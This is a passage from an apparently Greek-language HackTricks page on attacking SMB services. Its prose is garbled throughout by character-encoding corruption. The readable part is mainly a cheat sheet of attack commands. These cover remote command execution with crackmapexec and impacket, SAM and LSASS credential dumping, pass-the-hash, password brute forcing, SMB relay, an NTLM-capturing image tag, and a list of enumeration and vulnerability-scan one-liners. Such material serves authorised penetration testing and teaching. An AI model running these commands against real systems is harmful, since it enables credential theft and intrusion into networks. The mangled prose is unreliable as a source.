sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKCU -s
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKLM -s
```

## Post Exploitation

Î— **Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î· ÏÏÎ¸Î¼Î¹ÏƒÎ·** ÎµÎ½ÏŒÏ‚ **Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® Samba** ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Î²ÏÎ¯ÏƒÎºÎµÏ„Î±Î¹ ÏƒÏ„Î¿ `/etc/samba/smb.conf` ÎºÎ±Î¹ ÎµÎ½Î´Î­Ï‡ÎµÏ„Î±Î¹ Î½Î± Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Î¼ÎµÏÎ¹ÎºÎ­Ï‚ **ÎµÏ€Î¹ÎºÎ¯Î½Î´Ï…Î½ÎµÏ‚ ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚**:

| **Î¡ÏÎ¸Î¼Î¹ÏƒÎ·**                 | **Î ÎµÏÎ¹Î³ÏÎ±Ï†Î®**                                                         |
| --------------------------- | --------------------------------------------------------------------- |
| `browseable = yes`          | ÎÎ± ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÏ„Î±Î¹ Î· ÎµÎ¼Ï†Î¬Î½Î¹ÏƒÎ· Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼Ï‰Î½ ÎºÎ¿Î¹Î½ÏÎ½ Ï†Î±ÎºÎ­Î»Ï‰Î½;                  |
| `read only = no`            | ÎÎ± Î±Ï€Î±Î³Î¿ÏÎµÏÎµÏ„Î±Î¹ Î· Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± ÎºÎ±Î¹ Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¯Î·ÏƒÎ· Î±ÏÏ‡ÎµÎ¯Ï‰Î½;                 |
| `writable = yes`            | ÎÎ± ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÏ„Î±Î¹ ÏƒÏ„Î¿Ï…Ï‚ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ Î· Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± ÎºÎ±Î¹ Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¯Î·ÏƒÎ· Î±ÏÏ‡ÎµÎ¯Ï‰Î½;    |
| `guest ok = yes`            | ÎÎ± ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÏ„Î±Î¹ Î· ÏƒÏÎ½Î´ÎµÏƒÎ· ÏƒÏ„Î·Î½ Ï…Ï€Î·ÏÎµÏƒÎ¯Î± Ï‡Ï‰ÏÎ¯Ï‚ Ï‡ÏÎ®ÏƒÎ· ÎºÏ‰Î´Î¹ÎºÎ¿Ï Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚; |
| `enable privileges = yes`   | ÎÎ± Ï„Î·ÏÎ¿ÏÎ½Ï„Î±Î¹ Ï„Î± Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î± Ï€Î¿Ï… Î­Ï‡Î¿Ï…Î½ Î±Î½Î±Ï„ÎµÎ¸ÎµÎ¯ ÏƒÎµ ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î¿ SID;      |
| `create mask = 0777`        | Î Î¿Î¹ÎµÏ‚ Î¬Î´ÎµÎ¹ÎµÏ‚ Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î±Î½Î±Ï„ÎµÎ¸Î¿ÏÎ½ ÏƒÏ„Î± Î½ÎµÎ¿Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î·Î¼Î­Î½Î± Î±ÏÏ‡ÎµÎ¯Î±;         |
| `directory mask = 0777`     | Î Î¿Î¹ÎµÏ‚ Î¬Î´ÎµÎ¹ÎµÏ‚ Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î±Î½Î±Ï„ÎµÎ¸Î¿ÏÎ½ ÏƒÏ„Î¿Ï…Ï‚ Î½ÎµÎ¿Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î·Î¼Î­Î½Î¿Ï…Ï‚ Ï†Î±ÎºÎ­Î»Î¿Ï…Ï‚;   |
| `logon script = script.sh`  | Î Î¿Î¹Î¿ ÏƒÎµÎ½Î¬ÏÎ¹Î¿ Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎµÎºÏ„ÎµÎ»ÎµÏƒÏ„ÎµÎ¯ ÎºÎ±Ï„Î¬ Ï„Î· ÏƒÏÎ½Î´ÎµÏƒÎ· Ï„Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î·;         |
| `magic script = script.sh`  | Î Î¿Î¹Î¿ ÏƒÎµÎ½Î¬ÏÎ¹Î¿ Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎµÎºÏ„ÎµÎ»ÎµÏƒÏ„ÎµÎ¯ ÏŒÏ„Î±Î½ ÎºÎ»ÎµÎ¯Î½ÎµÎ¹ Ï„Î¿ ÏƒÎµÎ½Î¬ÏÎ¹Î¿;            |
| `magic output = script.out` | Î Î¿Ï Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î±Ï€Î¿Î¸Î·ÎºÎµÏ…Ï„ÎµÎ¯ Ï„Î¿ Î±Ï€Î¿Ï„Î­Î»ÎµÏƒÎ¼Î± Ï„Î¿Ï… Î¼Î±Î³Î¹ÎºÎ¿Ï ÏƒÎµÎ½Î±ÏÎ¯Î¿Ï…;         |

Î— ÎµÎ½Ï„Î¿Î»Î® `smbstatus` Ï€Î±ÏÎ­Ï‡ÎµÎ¹ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Ï„Î¿Î½ **Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®** ÎºÎ±Î¹ Î¼Îµ Ï„Î¿ **Ï€Î¿Î¹Î¿Ï‚ ÎµÎ¯Î½Î±Î¹ ÏƒÏ…Î½Î´ÎµÎ´ÎµÎ¼Î­Î½Î¿Ï‚**.

## Î¤Î±Ï…Ï„Î¿Ï€Î¿Î¯Î·ÏƒÎ· Ï‡ÏÎ®ÏƒÎ·Ï‚ Kerberos

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Ï„Î±Ï…Ï„Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯Ï„Îµ** ÏƒÏ„Î¿ **Kerberos** Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î± ÎµÏÎ³Î±Î»ÎµÎ¯Î± **smbclient** ÎºÎ±Î¹ **rpcclient**:

```bash
smbclient --kerberos //ws01win10.domain.com/C$
rpcclient -k ws01win10.domain.com
```

## **Î•ÎºÏ„Î­Î»ÎµÏƒÎ· Î•Î½Ï„Î¿Î»ÏÎ½**

### **crackmapexec**

Î¤Î¿ crackmapexec Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ ÎµÎ½Ï„Î¿Î»Î­Ï‚ **ÎºÎ±Ï„Î±Ï‡ÏÎ·ÏƒÏ„ÎµÏÎ¿Î½Ï„Î±Ï‚** Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ Î±Ï€ÏŒ Ï„Î¹Ï‚ Î¼ÎµÎ¸ÏŒÎ´Î¿Ï…Ï‚ **mmcexec, smbexec, atexec, wmiexec** Î¼Îµ Ï„Î·Î½ **wmiexec** Î½Î± ÎµÎ¯Î½Î±Î¹ Î· **Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î·** Î¼Î­Î¸Î¿Î´Î¿Ï‚. ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï…Ï€Î¿Î´ÎµÎ¯Î¾ÎµÏ„Îµ Ï€Î¿Î¹Î± ÎµÏ€Î¹Î»Î¿Î³Î® Ï€ÏÎ¿Ï„Î¹Î¼Î¬Ï„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î¼Îµ Ï„Î·Î½ Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿ `--exec-method`:

```bash
apt-get install crackmapexec

crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable' #Execute Powershell
crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami #Excute cmd
crackmapexec smb 192.168.10.11 -u Administrator -H <NTHASH> -x whoami #Pass-the-Hash
# Using --exec-method {mmcexec,smbexec,atexec,wmiexec}

crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sam #Dump SAM
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --lsa #Dump LSASS in memmory hashes
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sessions #Get sessions (
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --loggedon-users #Get logged-on users
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --disks #Enumerate the disks
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --users #Enumerate users
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --groups # Enumerate groups
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --local-groups # Enumerate local groups
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --pass-pol #Get password policy
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --rid-brute #RID brute

crackmapexec smb <IP> -d <DOMAIN> -u Administrator -H <HASH> #Pass-The-Hash
```

### [**psexec**](../../windows-hardening/lateral-movement/psexec-and-winexec.md)**/**[**smbexec**](../../windows-hardening/lateral-movement/smbexec.md)

ÎšÎ±Î¹ Î¿Î¹ Î´ÏÎ¿ ÎµÏ€Î¹Î»Î¿Î³Î­Ï‚ Î¸Î± **Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎ¿Ï…Î½ Î­Î½Î± Î½Î­Î¿ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±** (Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ _\pipe\svcctl_ Î¼Î­ÏƒÏ‰ SMB) ÏƒÏ„Î¿ Î¼Î·Ï‡Î¬Î½Î·Î¼Î± Î¸ÏÎ¼Î±Ï„Î¿Ï‚ ÎºÎ±Î¹ Î¸Î± Ï„Î¿ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎ¿Ï…Î½ Î³Î¹Î± Î½Î± **ÎµÎºÏ„ÎµÎ»Î­ÏƒÎ¿Ï…Î½ ÎºÎ¬Ï„Î¹** (**psexec** Î¸Î± **Î±Î½ÎµÎ²Î¬ÏƒÎµÎ¹** Î­Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎ¹Î¼Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ ÏƒÏ„Î¿Î½ ÎºÎ¿Î¹Î½ÏŒÏ‡ÏÎ·ÏƒÏ„Î¿ Ï†Î¬ÎºÎµÎ»Î¿ ADMIN$ ÎºÎ±Î¹ **smbexec** Î¸Î± Î´ÎµÎ¯Ï‡Î½ÎµÎ¹ ÏƒÏ„Î¿ **cmd.exe/powershell.exe** ÎºÎ±Î¹ Î¸Î± Î²Î¬Î»ÎµÎ¹ ÏƒÏ„Î± Î¿ÏÎ¯ÏƒÎ¼Î±Ï„Î± Ï„Î¿ Ï†Î¿ÏÏ„Ï‰Î¼Î­Î½Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ --**Ï„ÎµÏ‡Î½Î¹ÎºÎ® Ï‡Ï‰ÏÎ¯Ï‚ Î±ÏÏ‡ÎµÎ¯Î¿-**-).\
**Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚** ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Ï„Î¿ [**psexec**](../../windows-hardening/lateral-movement/psexec-and-winexec.md) ÎºÎ±Î¹ Ï„Î¿ [**smbexec**](../../windows-hardening/lateral-movement/smbexec.md).\
Î£Ï„Î¿ **kali** Î²ÏÎ¯ÏƒÎºÎµÏ„Î±Î¹ ÏƒÏ„Î¿ /usr/share/doc/python3-impacket/examples/

```bash
#If no password is provided, it will be prompted
./psexec.py [[domain/]username[:password]@]<targetName or address>
./psexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
psexec \\192.168.122.66 -u Administrator -p 123456Ww
psexec \\192.168.122.66 -u Administrator -p q23q34t34twd3w34t34wtw34t # Use pass the hash
```

Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î· **Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿** `-k` Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï€Î¹ÏƒÏ„Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯Ï„Îµ ÎµÎ½Î±Î½Ï„Î¯Î¿Î½ Ï„Î¿Ï… **kerberos** Î±Î½Ï„Î¯ Î³Î¹Î± Ï„Î¿ **NTLM**

### [wmiexec](../../windows-hardening/lateral-movement/wmicexec.md)/dcomexec

Î•ÎºÏ„ÎµÎ»Î­ÏƒÏ„Îµ Î¼Îµ Î´Î¹Î±ÎºÏÎ¹Ï„Î¹ÎºÏŒÏ„Î·Ï„Î± Î­Î½Î± ÎºÎ­Î»Ï…Ï†Î¿Ï‚ ÎµÎ½Ï„Î¿Î»ÏÎ½ Ï‡Ï‰ÏÎ¯Ï‚ Î½Î± Î±Î³Î³Î¯Î¾ÎµÏ„Îµ Ï„Î¿ Î´Î¯ÏƒÎºÎ¿ Î® Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Î­Î½Î± Î½Î­Î¿ Ï…Ï€Î·ÏÎµÏƒÎ¯Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ DCOM Î¼Î­ÏƒÏ‰ **Î¸ÏÏÎ±Ï‚ 135.**\
Î£Ï„Î¿ **kali** Î²ÏÎ¯ÏƒÎºÎµÏ„Î±Î¹ ÏƒÏ„Î¿ /usr/share/doc/python3-impacket/examples/

```bash
#If no password is provided, it will be prompted
./wmiexec.py [[domain/]username[:password]@]<targetName or address> #Prompt for password
./wmiexec.py -hashes LM:NT administrator@10.10.10.103 #Pass-the-Hash
#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted
```

Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î· **Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿** `-k` Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï€Î¹ÏƒÏ„Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯Ï„Îµ ÎµÎ½Î±Î½Ï„Î¯Î¿Î½ Ï„Î¿Ï… **kerberos** Î±Î½Ï„Î¯ Î³Î¹Î± Ï„Î¿ **NTLM**.

```bash
#If no password is provided, it will be prompted
./dcomexec.py [[domain/]username[:password]@]<targetName or address>
./dcomexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted
```

### [AtExec](../../windows-hardening/lateral-movement/atexec.md)

Î•ÎºÏ„Î­Î»ÎµÏƒÎ· ÎµÎ½Ï„Î¿Î»ÏÎ½ Î¼Î­ÏƒÏ‰ Ï„Î¿Ï… Task Scheduler (Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ _\pipe\atsvc_ Î¼Î­ÏƒÏ‰ SMB).\
Î£Ï„Î¿ **kali** Î²ÏÎ¯ÏƒÎºÎµÏ„Î±Î¹ ÏƒÏ„Î¿ /usr/share/doc/python3-impacket/examples/

```bash
./atexec.py [[domain/]username[:password]@]<targetName or address> "command"
./atexec.py -hashes <LM:NT> administrator@10.10.10.175 "whoami"
```

## Impacket Î±Î½Î±Ï†Î¿ÏÎ¬

[https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)

## **Î”Î¿ÎºÎ¹Î¼Î¬ÏƒÏ„Îµ Î¼Îµ ÎµÎ¾Î±Î½Î±Î³ÎºÎ±ÏƒÎ¼ÏŒ Ï„Î± Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± Ï„Ï‰Î½ Ï‡ÏÎ·ÏƒÏ„ÏÎ½**

**Î‘Ï…Ï„ÏŒ Î´ÎµÎ½ ÏƒÏ…Î½Î¹ÏƒÏ„Î¬Ï„Î±Î¹, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î¼Ï€Î»Î¿ÎºÎ¬ÏÎµÏ„Îµ Î­Î½Î± Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ Î±Î½ Ï…Ï€ÎµÏÎ²ÎµÎ¯Ï„Îµ Ï„Î¹Ï‚ Î¼Î­Î³Î¹ÏƒÏ„ÎµÏ‚ ÎµÏ€Î¹Ï„ÏÎµÏ€ÏŒÎ¼ÎµÎ½ÎµÏ‚ Ï€ÏÎ¿ÏƒÏ€Î¬Î¸ÎµÎ¹ÎµÏ‚**

```bash
nmap --script smb-brute -p 445 <IP>
ridenum.py <IP> 500 50000 /root/passwds.txt #Get usernames bruteforcing that rids and then try to bruteforce each user name
```

## Î•Ï€Î¯Î¸ÎµÏƒÎ· SMB relay

Î‘Ï…Ï„Î® Î· ÎµÏ€Î¯Î¸ÎµÏƒÎ· Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Ï„Î¿ ÎµÏÎ³Î±Î»ÎµÎ¯Î¿ Responder Î³Î¹Î± Î½Î± **ÎºÎ±Ï„Î±Î³ÏÎ¬ÏˆÎµÎ¹ Ï„Î¹Ï‚ ÏƒÏ…Î½ÎµÎ´ÏÎ¯ÎµÏ‚ Ï€Î¹ÏƒÏ„Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚ SMB** ÏƒÎµ Î­Î½Î± ÎµÏƒÏ‰Ï„ÎµÏÎ¹ÎºÏŒ Î´Î¯ÎºÏ„Ï…Î¿ ÎºÎ±Î¹ Î½Î± Ï„Î¹Ï‚ **Î¼ÎµÏ„Î±Ï†Î­ÏÎµÎ¹** ÏƒÎµ Î¼Î¹Î± **ÏƒÏ„ÏŒÏ‡Î¿ Î¼Î·Ï‡Î±Î½Î®**. Î•Î¬Î½ Î· **ÏƒÏ…Î½ÎµÎ´ÏÎ¯Î± Ï€Î¹ÏƒÏ„Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚ ÎµÎ¯Î½Î±Î¹ ÎµÏ€Î¹Ï„Ï…Ï‡Î®Ï‚**, Î¸Î± ÏƒÎ±Ï‚ Î¼ÎµÏ„Î±Ï†Î­ÏÎµÎ¹ Î±Ï…Ï„ÏŒÎ¼Î±Ï„Î± ÏƒÎµ Î­Î½Î± **ÏƒÏÏƒÏ„Î·Î¼Î± shell**.\
[**Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î³Î¹Î± Î±Ï…Ï„Î®Î½ Ï„Î·Î½ ÎµÏ€Î¯Î¸ÎµÏƒÎ· ÎµÎ´Ï.**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

## SMB-Trap

Î— Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎ· Windows URLMon.dll Ï€ÏÎ¿ÏƒÏ€Î±Î¸ÎµÎ¯ Î±Ï…Ï„ÏŒÎ¼Î±Ï„Î± Î½Î± Ï€Î¹ÏƒÏ„Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ ÏƒÏ„Î¿Î½ ÎºÎµÎ½Ï„ÏÎ¹ÎºÏŒ Ï…Ï€Î¿Î»Î¿Î³Î¹ÏƒÏ„Î® ÏŒÏ„Î±Î½ Î¼Î¹Î± ÏƒÎµÎ»Î¯Î´Î± Ï€ÏÎ¿ÏƒÏ€Î±Î¸ÎµÎ¯ Î½Î± Î­Ï‡ÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ ÎºÎ¬Ï€Î¿Î¹Î¿ Ï€ÎµÏÎ¹ÎµÏ‡ÏŒÎ¼ÎµÎ½Î¿ Î¼Î­ÏƒÏ‰ SMB, Î³Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±: `img src="\\10.10.10.10\path\image.jpg"`

Î‘Ï…Ï„ÏŒ ÏƒÏ…Î¼Î²Î±Î¯Î½ÎµÎ¹ Î¼Îµ Ï„Î¹Ï‚ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯ÎµÏ‚:

* URLDownloadToFile
* URLDownloadToCache
* URLOpenStream
* URLOpenBlockingStream

ÎŸÎ¹ Î¿Ï€Î¿Î¯ÎµÏ‚ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½Ï„Î±Î¹ Î±Ï€ÏŒ Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î¿Ï…Ï‚ Ï€ÎµÏÎ¹Î·Î³Î·Ï„Î­Ï‚ ÎºÎ±Î¹ ÎµÏÎ³Î±Î»ÎµÎ¯Î± (ÏŒÏ€Ï‰Ï‚ Ï„Î¿ Skype)

![Î‘Ï€ÏŒ: http://www.elladodelmal.com/2017/02/como-hacer-ataques-smbtrap-windows-con.html](<../../.gitbook/assets/image (93).png>)

### SMBTrap Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ MitMf

![Î‘Ï€ÏŒ: http://www.elladodelmal.com/2017/02/como-hacer-ataques-smbtrap-windows-con.html](<../../.gitbook/assets/image (94).png>)

## ÎšÎ»Î¿Ï€Î® NTLM

Î Î±ÏÏŒÎ¼Î¿Î¹Î± Î¼Îµ Ï„Î¿ SMB Trapping, Î· Ï„Î¿Ï€Î¿Î¸Î­Ï„Î·ÏƒÎ· ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Ï‰Î½ Î±ÏÏ‡ÎµÎ¯Ï‰Î½ ÏƒÎµ Î­Î½Î± ÏƒÏÏƒÏ„Î·Î¼Î± ÏƒÏ„ÏŒÏ‡Î¿ (Î¼Î­ÏƒÏ‰ SMB, Î³Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±) Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï€ÏÎ¿ÎºÎ±Î»Î­ÏƒÎµÎ¹ Î¼Î¹Î± Ï€ÏÎ¿ÏƒÏ€Î¬Î¸ÎµÎ¹Î± Ï€Î¹ÏƒÏ„Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚ SMB, ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Î½Ï„Î±Ï‚ Ï„Î·Î½ Ï€Î±ÏÎµÎ¼Î²Î¿Î»Î® Ï„Î¿Ï… hash NetNTLMv2 Î¼Îµ Î­Î½Î± ÎµÏÎ³Î±Î»ÎµÎ¯Î¿ ÏŒÏ€Ï‰Ï‚ Ï„Î¿ Responder. Î¤Î¿ hash Î¼Ï€Î¿ÏÎµÎ¯ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î½Î± Î±Ï€Î¿ÎºÏ‰Î´Î¹ÎºÎ¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ ÎµÎºÏ„ÏŒÏ‚ ÏƒÏÎ½Î´ÎµÏƒÎ·Ï‚ Î® Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ ÏƒÎµ Î¼Î¹Î± [ÎµÏ€Î¯Î¸ÎµÏƒÎ· SMB relay](./#smb-relay-attack).

[Î”ÎµÎ¯Ï„Îµ: ntlm\_theft](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#ntlm\_theft)

## Î‘Ï…Ï„ÏŒÎ¼Î±Ï„ÎµÏ‚ Î•Î½Ï„Î¿Î»Î­Ï‚ HackTricks

```
Protocol_Name: SMB    #Protocol Abbreviation if there is one.
Port_Number:  137,138,139     #Comma separated if there is more than one.
Protocol_Description: Server Message Block         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for SMB
Note: |
While Port 139 is known technically as â€˜NBT over IPâ€™, Port 445 is â€˜SMB over IPâ€™. SMB stands for â€˜Server Message Blocksâ€™. Server Message Block in modern language is also known as Common Internet File System. The system operates as an application-layer network protocol primarily used for offering shared access to files, printers, serial ports, and other sorts of communications between nodes on a network.

#These are the commands I run in order every time I see an open SMB port

With No Creds
nbtscan {IP}
smbmap -H {IP}
smbmap -H {IP} -u null -p null
smbmap -H {IP} -u guest
smbclient -N -L //{IP}
smbclient -N //{IP}/ --option="client min protocol"=LANMAN1
rpcclient {IP}
rpcclient -U "" {IP}
crackmapexec smb {IP}
crackmapexec smb {IP} --pass-pol -u "" -p ""
crackmapexec smb {IP} --pass-pol -u "guest" -p ""
GetADUsers.py -dc-ip {IP} "{Domain_Name}/" -all
GetNPUsers.py -dc-ip {IP} -request "{Domain_Name}/" -format hashcat
GetUserSPNs.py -dc-ip {IP} -request "{Domain_Name}/"
getArch.py -target {IP}

With Creds
smbmap -H {IP} -u {Username} -p {Password}
smbclient "\\\\{IP}\\\" -U {Username} -W {Domain_Name} -l {IP}
smbclient "\\\\{IP}\\\" -U {Username} -W {Domain_Name} -l {IP} --pw-nt-hash `hash`
crackmapexec smb {IP} -u {Username} -p {Password} --shares
GetADUsers.py {Domain_Name}/{Username}:{Password} -all
GetNPUsers.py {Domain_Name}/{Username}:{Password} -request -format hashcat
GetUserSPNs.py {Domain_Name}/{Username}:{Password} -request

https://book.hacktricks.xyz/pentesting/pentesting-smb

Entry_2:
Name: Enum4Linux
Description: General SMB Scan
Command: enum4linux -a {IP}

Entry_3:
Name: Nmap SMB Scan 1
Description: SMB Vuln Scan With Nmap
Command: nmap -p 139,445 -vv -Pn --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse {IP}

Entry_4:
Name: Nmap Smb Scan 2
Description: SMB Vuln Scan With Nmap (Less Specific)
Command: nmap --script 'smb-vuln*' -Pn -p 139,445 {IP}

Entry_5:
Name: Hydra Brute Force
Description: Need User
Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} {IP} smb

Entry_6:
Name: SMB/SMB2 139/445 consolesless mfs enumeration
Description: SMB/SMB2 139/445  enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS {IP}; set RPORT 139; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb2; set RHOSTS {IP}; set RPORT 139; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS {IP}; set RPORT 445; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb2; set RHOSTS {IP}; set RPORT 445; run; exit'

```

<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ Ï‡Î¬ÎºÎ¹Î½Î³Îº ÏƒÏ„Î¿ AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Ï…Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î·Ï‚ Ï„Î¿Ï… HackTricks:

